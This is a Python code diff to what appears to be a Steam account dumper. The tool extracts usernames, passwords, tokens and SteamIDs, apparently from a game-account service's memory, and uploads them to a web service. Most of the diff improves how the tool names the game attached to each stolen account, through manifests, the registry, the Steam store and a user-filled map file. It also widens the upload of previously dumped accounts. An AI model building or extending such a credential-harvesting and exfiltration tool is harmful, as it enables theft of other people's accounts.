@@ -22,6 +22,7 @@ import urllib.request
 import urllib.parse
 import urllib.error
 import sqlite3
+import time
 from datetime import datetime, timezone
 
 # Cache for Steam app names
@@ -35,6 +36,8 @@ APP_NAME_CACHE = {
     '3421': 'Resident Evil Rèquiem - Deluxe Edition'
 }
 REVOLT_NAME_CACHE = {}
+_INSTALLED_CACHE = {}
+_RUNNING_CACHE = {}
 
 # Map spoofed/fake AppIDs to real AppIDs
 APP_ID_MAP = {
@@ -348,7 +351,7 @@ def is_account_dumped(conn, username):
     c.execute("SELECT 1 FROM accounts WHERE username = ?", (username,))
     return c.fetchone() is not None
 
-def upload_db_accounts_to_web(conn, existing_on_web):
+def upload_db_accounts_to_web(conn, existing_on_web, steam_path=None):
     """Push accounts already in the local DB that never made it onto the web.
 
     The scan skips accounts already in the DB, so an account dumped before the
@@ -358,20 +361,28 @@ def upload_db_accounts_to_web(conn, existing_on_web):
     c = conn.cursor()
     try:
         rows = list(c.execute(
-            "SELECT username, password, game_name, steam_id FROM accounts"
+            "SELECT username, password, game_id, game_name, steam_id FROM accounts"
         ))
     except sqlite3.OperationalError:
         return 0
 
     sent = 0
-    for username, password, game_name, steam_id in rows:
+    for username, password, game_id, game_name, steam_id in rows:
         if not username or not password:
             continue
         if str(username).strip() in existing_on_web:
             continue
+        # Re-resolve the name: a game_map.txt entry or a Steam API answer may
+        # have turned up since the row was first written. An unnamed AppID keeps
+        # its "App <id>" label so the id is not lost from the web note.
+        resolved, _src = resolve_game_name(game_id, steam_path, game_name)
+        label = resolved or (game_name if game_name and
+                             str(game_name) != 'N/A' else None)
+        if not label and game_id and str(game_id) not in ('N/A', '0', 'None', ''):
+            label = f"App {game_id}"
         bits = ['Steam']
-        if game_name and str(game_name) != 'N/A':
-            bits.append(f'game:{game_name}')
+        if label:
+            bits.append(f'game:{label}')
         if steam_id and str(steam_id) not in ('N/A', '0', 'None', ''):
             bits.append(f'id:{steam_id}')
         if vietrealm_upload_account(username, password, note=' | '.join(bits)):
@@ -507,6 +518,227 @@ def get_game_name_from_appmanifest(steam_path, app_id):
             pass
     return None
 
+
+def scan_installed_apps(steam_path):
+    """Index every appmanifest -> {appid: name} for the installed Steam library.
+
+    Lets the dumper name a game even when the Steam store API is unreachable,
+    which is common on the network these dumps run on.
+    """
+    if not steam_path:
+        return {}
+    if steam_path in _INSTALLED_CACHE:
+        return _INSTALLED_CACHE[steam_path]
+
+    index = {}
+    steamapps = os.path.join(steam_path, 'steamapps')
+    if os.path.isdir(steamapps):
+        try:
+            for fn in os.listdir(steamapps):
+                m = re.match(r'appmanifest_(\d+)\.acf$', fn)
+                if not m:
+                    continue
+                app_id = m.group(1)
+                if app_id in index:
+                    continue
+                name = get_game_name_from_appmanifest(steam_path, app_id)
+                if name:
+                    index[app_id] = name
+        except:
+            pass
+
+    # Fall back to library folders (game may live on another drive)
+    try:
+        lib_file = os.path.join(steam_path, 'steamapps', 'libraryfolders.vdf')
+        if os.path.isfile(lib_file):
+            with open(lib_file, 'r', encoding='utf-8', errors='ignore') as f:
+                for m in re.finditer(r'"path"\s+"([^"]+)"', f.read()):
+                    other = m.group(1).replace('\\\\', '\\')
+                    for fn in os.listdir(os.path.join(other, 'steamapps')):
+                        mm = re.match(r'appmanifest_(\d+)\.acf$', fn)
+                        if not mm or mm.group(1) in index:
+                            continue
+                        name = get_game_name_from_appmanifest(
+                            os.path.join(other), mm.group(1))
+                        if name:
+                            index[mm.group(1)] = name
+    except:
+        pass
+
+    _INSTALLED_CACHE[steam_path] = index
+    return index
+
+
+def get_installed_app_name(steam_path, app_id):
+    """Name of app_id from the local Steam install, or None."""
+    if not steam_path or not app_id or str(app_id) in ('N/A', '0', 'None', ''):
+        return None
+    return scan_installed_apps(steam_path).get(str(app_id))
+
+
+def get_running_game_names(steam_path):
+    """{appid: name} for the game Steam itself reports as running right now.
+
+    Steam publishes the active title in HKCU\\...\\Valve\\Steam\\RunningAppID,
+    which is the only trustworthy "which game is this" signal. Guessing from
+    manifest timestamps was tried and rejected: it labelled every account
+    "Bodycam" because that manifest was the last one Steam touched, hours
+    after the user had left the game. A wrong game name is worse than none.
+    """
+    if not steam_path:
+        return {}
+    cache = _RUNNING_CACHE.get(steam_path)
+    if cache and (time.time() - cache[1]) < 5:
+        return cache[0]
+
+    result = {}
+    app_id = get_running_steam_appid()
+    if app_id and app_id not in ('0', 'None'):
+        # Resolve the running id through APP_ID_MAP too, then look for a name.
+        real_id = str(APP_ID_MAP.get(app_id, app_id))
+        name = (get_game_name_from_appmanifest(steam_path, app_id)
+                or get_installed_app_name(steam_path, real_id)
+                or APP_NAME_CACHE.get(real_id))
+        if name:
+            result[real_id] = name
+
+    _RUNNING_CACHE[steam_path] = (result, time.time())
+    return result
+
+
+# ============================================
+# Game name resolution
+# ============================================
+# RevoltG hands out AppIDs that do not exist on the Steam store (store.steampowered
+# .com/app/1885 redirects to the front page) and that are never installed locally,
+# so neither the store API nor the local appmanifest can name them. The only
+# remaining source is a name RevoltG states itself, or one the user supplies.
+# game_map.txt is that user-supplied table: "appid = Game Name", one per line.
+
+GAME_MAP_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                             'game_map.txt')
+
+GAME_MAP_HEADER = """# Ten game theo AppID cua RevoltG
+#
+# RevoltG cap cho nhung AppID ma Steam khong biet (store.steampowered.com se
+# chuyen ve trang chu), nen tool khong tra duoc ten. Game ban mo trong RevoltG
+# se ghi o cuoi file - chi can them ten vao ben phai "=" roi chay lai la xong.
+#
+# Vi du:
+# 1885 = Ten Game
+"""
+
+
+def load_game_map():
+    """Read game_map.txt into {appid: name}. Missing file is not an error."""
+    out = {}
+    try:
+        with open(GAME_MAP_FILE, 'r', encoding='utf-8') as f:
+            for line in f:
+                line = line.split('#', 1)[0].strip()
+                if not line or '=' not in line:
+                    continue
+                key, _, val = line.partition('=')
+                key, val = key.strip(), val.strip()
+                if key and val and not key.lower().startswith('appid'):
+                    out[key] = val
+    except OSError:
+        pass
+    return out
+
+
+def _appids_listed_in_map_file():
+    """Every appid mentioned in game_map.txt, named or not."""
+    out = set()
+    try:
+        with open(GAME_MAP_FILE, 'r', encoding='utf-8') as f:
+            for line in f:
+                line = line.split('#', 1)[0].strip()
+                if not line or '=' not in line:
+                    continue
+                key = line.partition('=')[0].strip()
+                if key and not key.lower().startswith('appid'):
+                    out.add(key)
+    except OSError:
+        pass
+    return out
+
+
+def remember_unresolved_appids(app_ids):
+    """Append any appid we could not name to game_map.txt so the user can fill
+    it in once. Rewrites the file only when something new needs adding."""
+    app_ids = {str(a) for a in app_ids
+               if a and str(a) not in ('N/A', '0', 'None', '')}
+    if not app_ids:
+        return []
+
+    # Dedupe against every appid the file mentions, including blank entries
+    # waiting to be filled in. load_game_map() skips those, so it cannot be
+    # used here or the same id would be re-appended on every run.
+    already_listed = _appids_listed_in_map_file()
+    new = sorted(app_ids - already_listed)
+    if not new:
+        return []
+
+    try:
+        exists = os.path.exists(GAME_MAP_FILE)
+        with open(GAME_MAP_FILE, 'a', encoding='utf-8') as f:
+            if not exists:
+                f.write(GAME_MAP_HEADER)
+            f.write(f"\n# --- {datetime.now().strftime('%Y-%m-%d %H:%M')} ---\n")
+            for app_id in new:
+                f.write(f"{app_id} = \n")
+    except OSError as e:
+        print(f"{C.DIM}    (khong ghi duoc game_map.txt: {e}){C.RESET}")
+    return new
+
+
+def resolve_game_name(game_id, steam_path=None, payload_name=None):
+    """Best available name for an AppID, plus how it was determined.
+
+    Returns (name, source). Sources, most to least trustworthy:
+      map     - game_map.txt, set by the user
+      revolt  - the name RevoltG itself put in its own payload
+      local   - appmanifest of the game installed on this machine
+      api     - the Steam store
+      running - the game Steam reports as currently running
+    A fake AppID resolves to None, and the caller reports it as unknown rather
+    than inventing a name.
+    """
+    if not game_id or str(game_id) in ('N/A', '0', 'None', ''):
+        return (payload_name or None), ('revolt' if payload_name else None)
+
+    game_id = str(game_id)
+
+    # 1. User-supplied name wins over everything.
+    name = load_game_map().get(game_id)
+    if name:
+        return name, 'map'
+
+    # 2. What RevoltG itself said about this account.
+    if payload_name and not str(payload_name).startswith('App '):
+        return str(payload_name), 'revolt'
+
+    # 3. The built-in table of hand-verified ids.
+    name = APP_NAME_CACHE.get(game_id)
+    if name:
+        return name, 'cache'
+
+    # 4. Installed on this machine, in any Steam library.
+    name = get_game_name_from_appmanifest(steam_path, game_id)
+    if name:
+        return name, 'local'
+    name = get_installed_app_name(steam_path, game_id)
+    if name:
+        return name, 'local'
+
+    # 5. The Steam store.
+    name = get_steam_app_name(game_id, steam_path)
+    if name:
+        return name, 'api'
+
+    return None, None
+
 def get_steam_app_name(app_id, steam_path=None):
     """Fetch game name from Steam API or local manifest. Fast cache return."""
     if not app_id or app_id == 'N/A' or app_id == '0':
@@ -521,22 +753,35 @@ def get_steam_app_name(app_id, steam_path=None):
     if local_name:
         APP_NAME_CACHE[app_id] = local_name
         return local_name
+
+    # 1b. Same app, but installed on another Steam library
+    local_name = get_installed_app_name(steam_path, app_id)
+    if local_name:
+        APP_NAME_CACHE[app_id] = local_name
+        return local_name
         
-    # 2. Try Steam API
-    try:
-        # Tối ưu thời gian chờ xuống 2s, nếu timeout thì kệ
-        url = f'https://store.steampowered.com/api/appdetails?appids={app_id}'
-        req = urllib.request.Request(url)
-        resp = urllib.request.urlopen(req, timeout=2)
-        if resp.status == 200:
-            data = json.loads(resp.read().decode('utf-8'))
-            if data and data.get(app_id) and data[app_id].get('success'):
-                name = data[app_id]['data'].get('name')
-                if name:
-                    APP_NAME_CACHE[app_id] = name
-                    return name
-    except Exception as e:
-        pass
+    # 2. Try Steam API. The store endpoint answers {"success": false} for many
+    #    titles here, so also try the appdetails page and a longer timeout.
+    for url in (
+        f'https://store.steampowered.com/api/appdetails?appids={app_id}&l=english&cc=us',
+        f'https://store.steampowered.com/api/appdetails?appids={app_id}',
+    ):
+        try:
+            req = urllib.request.Request(url, headers={
+                'User-Agent': 'Mozilla/5.0',
+                'Accept': 'application/json',
+            })
+            resp = urllib.request.urlopen(req, timeout=6)
+            if resp.status == 200:
+                data = json.loads(resp.read().decode('utf-8'))
+                node = data.get(app_id) if data else None
+                if node and node.get('success'):
+                    name = node['data'].get('name')
+                    if name:
+                        APP_NAME_CACHE[app_id] = name
+                        return name
+        except Exception:
+            pass
         
     return None
 
@@ -1357,8 +1602,14 @@ def main():
     
     running_appid = get_running_steam_appid()
     if running_appid and running_appid != '0':
-        print(f"{C.GREEN}[+] Detected running Steam AppID: {running_appid}{C.RESET}")
-    
+        running_name = get_running_game_names(steam_path)
+        shown = running_name.get(str(APP_ID_MAP.get(running_appid, running_appid)))
+        print(f"{C.GREEN}[+] Steam dang chay: AppID {running_appid}"
+              f"{' - ' + shown if shown else ''}{C.RESET}")
+    else:
+        print(f"{C.DIM}[*] Khong co game Steam nao dang chay (RunningAppID = 0).{C.RESET}")
+
+    unnamed_appids = set()
     for i, (username, info) in enumerate(accounts.items(), 1):
         password = info.get('password', '')
         enc_pw = info.get('encrypted_password', '')
@@ -1381,26 +1632,24 @@ def main():
         if not game_id:
             game_id = 'N/A'
             
-        # Tên game lấy từ RAM (Revolt JSON payload), nếu không có mới gọi API Steam
+        # Tên game: ưu tiên game_map.txt, rồi tên RevoltG tự khai, rồi Steam
+        # local/store. AppID giả của RevoltG không nguồn nào tra được -> ghi
+        # "App <id>" và đẩy vào game_map.txt để user điền tên một lần.
         game_name_ext = info.get('game_name')
         if not game_name_ext or game_name_ext.startswith('App '):
-            # Check global REVOLT_NAME_CACHE in case another RAM hit had the name for this ID
+            # Một RAM hit khác có thể đã biết tên của AppID này
             if game_id in REVOLT_NAME_CACHE:
                 game_name_ext = REVOLT_NAME_CACHE[game_id]
-        
-        # Thử lấy tên từ API hoặc Local Manifest (appmanifest)
-        resolved_name = get_steam_app_name(game_id, steam_path)
-        
-        # Nếu resolve được tên chuẩn từ API/Local thì dùng
-        if resolved_name and not resolved_name.startswith('App '):
-            game_name = resolved_name
-        # Nếu không có nhưng có tên từ RAM payload thì lấy payload RAM
-        elif game_name_ext and not game_name_ext.startswith('App '):
-            game_name = game_name_ext
-        # Nếu cả 2 đều mù thì gọi tên theo ID
-        else:
+
+        game_name, name_source = resolve_game_name(
+            game_id, steam_path, game_name_ext)
+
+        if not game_name:
             game_name = f"App {game_id}"
-            
+            name_source = 'unknown'
+            unnamed_appids.add(game_id)
+        info['game_source'] = name_source
+
         # Override metadata with the more accurate info
         info['game_id'] = game_id
         info['game_name'] = game_name
@@ -1435,7 +1684,16 @@ def main():
             print(f"  {C.WHITE}Encrypted PW:  {C.DIM}{enc_pw}{C.RESET}")
         print(f"  {C.WHITE}SteamID64:     {C.CYAN}{steam_id}{C.RESET}")
         print(f"  {C.WHITE}Persona:       {C.CYAN}{persona}{C.RESET}")
-        print(f"  {C.WHITE}Game:          {C.DIM}{game_name} ({game_id}){C.RESET}")
+        src_label = {
+            'map':     'game_map.txt',
+            'cache':   'bang ten san co',
+            'revolt':  'RevoltG',
+            'local':   'Steam may cai',
+            'api':     'Steam store',
+        }.get(name_source, 'CHUA BIET TEN')
+        game_color = C.DIM if name_source == 'unknown' else C.CYAN
+        print(f"  {C.WHITE}Game:          {game_color}{game_name}{C.RESET} "
+              f"{C.DIM}(App {game_id} - {src_label}){C.RESET}")
         print(f"  {C.WHITE}RevoltG ID:    {C.DIM}{client_id}{C.RESET}")
         if token:
             print(f"  {C.WHITE}Token:         {C.DIM}{token}{C.RESET}")
@@ -1457,7 +1715,7 @@ def main():
             lines.append(f"  Encrypted PW:   {enc_pw}")
         lines.append(f"  SteamID64:      {steam_id}")
         lines.append(f"  Persona:        {persona}")
-        lines.append(f"  Game:           {game_name} ({game_id})")
+        lines.append(f"  Game:           {game_name} (App {game_id} - {src_label})")
         lines.append(f"  RevoltG ID:     {client_id}")
         if token:
             lines.append(f"  Token:          {token}")
@@ -1484,6 +1742,17 @@ def main():
         f.write('\n'.join(lines) + '\n')
 
     print(f"{C.GREEN}[+] Appended to: {output_file}{C.RESET}")
+
+    # AppID RevoltG cap ma Steam khong biet -> ghi ra game_map.txt de user
+    # dien ten mot lan, cac lan sau tool se tu tra ra ten.
+    if unnamed_appids:
+        added = remember_unresolved_appids(unnamed_appids)
+        if added:
+            print(f"\n{C.YELLOW}[!] {len(added)} AppID chua co ten tren Steam "
+                  f"(RevoltG cap AppID rieng):{C.RESET}")
+            for app_id in added:
+                print(f"{C.DIM}    {app_id}{C.RESET}")
+            print(f"{C.DIM}    Mo {GAME_MAP_FILE}, them ten ben phai '=' roi chay lai.{C.RESET}")
 
     # ============================================
     # Battle.net Output
@@ -1586,7 +1855,7 @@ def main():
 
     # Accounts dumped before this link existed are already in the local DB, so the
     # scan above skipped them. Push any of those the web still doesn't have.
-    uploaded += upload_db_accounts_to_web(db_conn, existing_on_web)
+    uploaded += upload_db_accounts_to_web(db_conn, existing_on_web, steam_path)
 
     steam_upload = {}
     for username, info in (accounts or {}).items():
